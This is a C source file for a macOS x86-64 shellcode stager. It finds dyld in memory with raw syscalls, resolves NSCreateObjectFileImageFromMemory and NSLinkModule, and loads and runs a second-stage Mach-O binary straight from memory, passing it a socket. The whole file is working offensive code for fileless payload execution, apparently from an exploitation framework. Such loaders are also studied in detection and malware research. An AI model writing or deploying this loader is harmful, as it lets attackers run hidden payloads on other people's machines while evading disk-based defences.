/*
 * References:
 * @parchedmind
 * https://github.com/CylanceVulnResearch/osx_runbin/blob/master/run_bin.c
 *
 * @nologic
 * https://github.com/nologic/shellcc
 */

#include <stdio.h>
#include <string.h>

#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <mach-o/dyld.h>

#include <sys/types.h>
#include <sys/sysctl.h>

typedef NSObjectFileImageReturnCode (*NSCreateObjectFileImageFromMemory_ptr)(void *address, unsigned long size, NSObjectFileImage *objectFileImage);
typedef NSModule (*NSLinkModule_ptr)(NSObjectFileImage objectFileImage, const char* moduleName, unsigned long options);

uint64_t find_macho(uint64_t addr, unsigned int increment, unsigned int pointer);
uint64_t find_symbol(uint64_t base, char* symbol);
uint64_t find_entry_offset(struct mach_header_64 *mh);
int string_compare(const char* s1, const char* s2);
int detect_sierra();

/*#define DEBUG*/
#ifdef DEBUG
static void print(char * str);
#endif

#define DYLD_BASE_ADDR 0x00007fff5fc00000

int main(int argc, char** argv)
{
#ifdef DEBUG
  print("main!\n");
#endif
  uint64_t buffer = 0;
  uint64_t buffer_size = 0;
  __asm__(
      "movq %%r10, %0;\n"
      "movq %%r12, %1;\n"
      : "=g"(buffer), "=g"(buffer_size));

#ifdef DEBUG
  print("hello world!\n");
#endif

  int sierra = detect_sierra();
  uint64_t binary = DYLD_BASE_ADDR;
  if (sierra) {
    binary = find_macho(0x100000000, 0x1000, 0);
    if (!binary) {
      return 1;
    }
    binary += 0x1000;
  }
  uint64_t dyld = find_macho(binary, 0x1000, 0);
  if (!dyld) {
    return 1;
  }

  NSCreateObjectFileImageFromMemory_ptr NSCreateObjectFileImageFromMemory_func = (void*)find_symbol(dyld, "_NSCreateObjectFileImageFromMemory");
  if (!NSCreateObjectFileImageFromMemory_func) {
    return 1;
  } 
#ifdef DEBUG
  print("good symbol!\n");
#endif

  NSLinkModule_ptr NSLinkModule_func = (void*)find_symbol(dyld, "_NSLinkModule");
  if (!NSLinkModule_func) {
    return 1;
  } 

  if (!sierra) {
    NSCreateObjectFileImageFromMemory_func -= DYLD_BASE_ADDR;
    NSLinkModule_func -= DYLD_BASE_ADDR;
  }

  /*if (*(char*)buffer == 'b') {*/
  /*print("magic b!\n");*/
  /*}*/
  *(char*)buffer = '\xcf';
  ((uint32_t *)buffer)[3] = MH_BUNDLE;

  NSObjectFileImage fi = 0; 
  if (NSCreateObjectFileImageFromMemory_func((void*)buffer, buffer_size, &fi) != 1) {
    return 1;
  }
#ifdef DEBUG
  print("created!\n");
#endif

  NSModule nm = NSLinkModule_func(fi, "", NSLINKMODULE_OPTION_PRIVATE | NSLINKMODULE_OPTION_BINDNOW | NSLINKMODULE_OPTION_RETURN_ON_ERROR);
  if (!nm) {
#ifdef DEBUG
    print("no nm!\n");
#endif
    return 1;
  }
#ifdef DEBUG
  print("good nm!\n");
#endif

  uint64_t execute_base = (uint64_t)nm;
  execute_base = find_macho(execute_base, sizeof(int), 1);

  uint64_t entry_off = find_entry_offset((void*)execute_base);
  if (!entry_off) {
    return 1;
  }
  uint64_t entry = (execute_base + entry_off);
  int(*main_func)(int, char**) = (int(*)(int, char**))entry;
  char* socket = (char*)(size_t)argc;
  char *new_argv[] = { "m", socket, NULL };
  int new_argc = 2;
  return main_func(new_argc, new_argv);
}

uint64_t find_symbol(uint64_t base, char* symbol) 
{
  struct segment_command_64 *sc, *linkedit, *text;
  struct load_command *lc;
  struct symtab_command *symtab;
  struct nlist_64 *nl;

  char *strtab;
  symtab = 0;
  linkedit = 0;
  text = 0;

  lc = (struct load_command *)(base + sizeof(struct mach_header_64));
  for (int i=0; i<((struct mach_header_64 *)base)->ncmds; i++) {
    if (lc->cmd == LC_SYMTAB) {
      symtab = (struct symtab_command *)lc;
    } else if (lc->cmd == LC_SEGMENT_64) {
      sc = (struct segment_command_64 *)lc;
      char * segname = ((struct segment_command_64 *)lc)->segname;
      if (string_compare(segname, "__LINKEDIT") == 0) {
        linkedit = sc;
      } else if (string_compare(segname, "__TEXT") == 0) {
        text = sc;
      }
    }
    lc = (struct load_command *)((unsigned long)lc + lc->cmdsize);
  }

  if (!linkedit || !symtab || !text) {
    return 0;
  }

  unsigned long file_slide = linkedit->vmaddr - text->vmaddr - linkedit->fileoff;
  strtab = (char *)(base + file_slide + symtab->stroff);

  nl = (struct nlist_64 *)(base + file_slide + symtab->symoff);
  for (int i=0; i<symtab->nsyms; i++) {
    char *name = strtab + nl[i].n_un.n_strx;
    /*#ifdef DEBUG*/
    /*print(name);*/
    /*print("\n");*/
    /*#endif*/
    if (string_compare(name, symbol) == 0) {
      return base + nl[i].n_value;
    }
  }

  return 0;
}

uint64_t syscall_chmod(uint64_t path, long mode) 
{
  uint64_t chmod_no = 0x200000f;
  uint64_t ret = 0;
  __asm__(
      "movq %1, %%rax;\n"
      "movq %2, %%rdi;\n"
      "movq %3, %%rsi;\n"
      "syscall;\n"
      "movq %%rax, %0;\n"
      : "=g"(ret)
      : "g"(chmod_no), "S"(path), "g"(mode)
      :);
  return ret;
}

uint64_t find_macho(uint64_t addr, unsigned int increment, unsigned int pointer) 
{
  while(1) {
    uint64_t ptr = addr;
    if (pointer) {
      ptr = *(uint64_t *)ptr;
    }
    unsigned long ret = syscall_chmod(ptr, 0777);
    if (ret == 0x2 && ((int *)ptr)[0] == MH_MAGIC_64) {
      return ptr;
    }

    addr += increment;
  }
  return 0;
}

uint64_t find_entry_offset(struct mach_header_64 *mh)
{
  struct entry_point_command *entry;
  struct load_command *lc = (struct load_command *)((void*)mh + sizeof(struct mach_header_64));
  for (int i=0; i<mh->ncmds; i++) {
    if (lc->cmd == LC_MAIN) {
      entry = (struct entry_point_command *)lc;
      return entry->entryoff;
    }

    lc = (struct load_command *)((unsigned long)lc + lc->cmdsize);
  }

  return 0;
}

int string_compare(const char* s1, const char* s2) 
{
  while (*s1 != '\0' && *s1 == *s2)
  {
    s1++;
    s2++;
  }
  return (*(unsigned char *) s1) - (*(unsigned char *) s2);
}

int detect_sierra()
{
  uint64_t sc_sysctl = 0x20000ca;
  int name[] = { CTL_KERN, KERN_OSRELEASE };
  uint64_t nameptr = (uint64_t)&name;
  uint64_t namelen = sizeof(name)/sizeof(name[0]);
  char osrelease[32];
  size_t size = sizeof(osrelease);
  uint64_t valptr = (uint64_t)osrelease;
  uint64_t valsizeptr = (uint64_t)&size;
  uint64_t ret = 0;

  __asm__(
      "mov %1, %%rax;\n"
      "mov %2, %%rdi;\n"
      "mov %3, %%rsi;\n"
      "mov %4, %%rdx;\n"
      "mov %5, %%r10;\n"
      "xor %%r8, %%r8;\n"
      "xor %%r9, %%r9;\n"
      "syscall;\n"
      "mov %%rax, %0;\n"
      : "=g"(ret)
      : "g"(sc_sysctl), "g"(nameptr), "g"(namelen), "g"(valptr), "g"(valsizeptr)
      : );

  // osrelease is 16.x.x on Sierra
  if (ret == 0 && size > 2) {
    if (osrelease[0] == '1' && osrelease[1] < '6') {
      return 0;
    }
    if (osrelease[0] <= '9' && osrelease[1] == '.') {
      return 0;
    }
  }
  return 1;
}

#ifdef DEBUG
int string_len(const char* s1) 
{
  const char* s2 = s1;
  while (*s2 != '\0')
  {
    s2++;
  }
  return (s2 - s1);
}

void print(char * str) 
{
  long write = 0x2000004;
  long stdout = 1;
  unsigned long len = string_len(str);
  unsigned long long addr = (unsigned long long) str;
  unsigned long ret = 0;
  /* ret = write(stdout, str, len); */
  __asm__(
      "movq %1, %%rax;\n"
      "movq %2, %%rdi;\n"
      "movq %3, %%rsi;\n"
      "movq %4, %%rdx;\n"
      "syscall;\n"
      "movq %%rax, %0;\n"
      : "=g"(ret)
      : "g"(write), "g"(stdout), "S"(addr), "g"(len)
      : "rax", "rdi", "rdx" );
}
#endif
